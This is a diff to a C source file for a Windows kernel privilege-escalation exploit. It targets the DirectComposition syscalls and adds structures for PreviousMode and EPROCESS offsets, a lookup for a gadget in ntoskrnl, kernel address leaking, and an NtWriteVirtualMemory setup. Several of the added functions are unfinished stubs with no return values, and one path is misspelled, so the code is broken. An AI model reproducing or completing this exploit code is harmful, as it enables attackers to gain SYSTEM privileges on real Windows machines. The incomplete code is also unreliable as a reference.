@@ -1,6 +1,40 @@
 #include <stdio.h>
 #include <windows.h>
 #include <winternl.h>
+#include "ntos.h"
+
+typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
+    SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength);
+
+typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
+    HANDLE ProcessHandle,
+    void* BaseAddress,
+    const void* SourceBuffer,
+    size_t Length,
+    size_t* BytesWritten);
+
+typedef struct _EXPLOIT_CONTEXT {
+    PPEB pPeb;
+    _NtQuerySystemInformation fnNtQuerySystemInformation;
+    _NtWriteVirtualMemory fnNtWriteVirtualMemory;
+
+    HANDLE hCurProcessHandle;
+    HANDLE hCurThreadHandle;
+    DWORD64 dwKernelEprocessAddr;
+    DWORD64 dwKernelEthreadAddr;
+
+    DWORD previous_mode_offset;
+
+    DWORD win32_process_offset; // EPROCESS->Win32Process
+
+    DWORD GadgetAddrOffset;
+    DWORD ObjectSize;
+}EXPLOIT_CONTEXT, * PEXPLOIT_CONTEXT;
+
+PEXPLOIT_CONTEXT g_pExploitCtx;
 
 typedef NTSTATUS(*pNtDCompositionCreateChannel)(
     OUT PHANDLE pArgChannelHandle,
@@ -68,10 +102,39 @@ pNtDCompositionCreateChannel NtDCompositionCreateChannel;
 pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
 pNtDCompositionCommitChannel NtDCompositionCommitChannel;
 
+DWORD64 GetModuleAddr(const char* name) {
+    PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);
+    DWORD outBuffer = 0;
+    NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
+}
+
+DWORD64 GetGadgetAddr(const char* name) {
+    DWORD64 base = GetModuleAddr("\\SymtemRoot\\system32\\ntoskrnl.exe");
+}
+
+SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object) {
+    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
+    ULONG handleInfoSize = 0x1000;
+    ULONG retLength;
+    NTSTATUS status;
+    SIZE_T kernelAddress = 0;
+    BOOL bFind = FALSE;
+
+}
+
+BOOL InitEnvironment() {
+    g_pExploitCtx = new EXPLOIT_CONTEXT;    
+    g_pExploitCtx->fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
+    g_pExploitCtx->fnNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtWriteVirtualMemory");
+    g_pExploitCtx->pPeb = NtCurrentTeb()->ProcessEnvironmentBlock;
+
+}
+
 int main(int argc, TCHAR* argv[])
 {
 
     LoadLibrary(L"user32.dll");
+    DWORD64 GadgetAddr = GetGadgetAddr("SeSetAccessStateGenericMapping");
     NTSTATUS ntStatus;
     HMODULE win32u = LoadLibrary(L"win32u.dll");
     NtDCompositionCreateChannel = (pNtDCompositionCreateChannel)GetProcAddress(win32u, "NtDCompositionCreateChannel");
@@ -161,5 +224,7 @@ int main(int argc, TCHAR* argv[])
         exit(-1);
     }
     printf("[+] Release Resource Tracker1\n");
-    
+
+
+      
 }
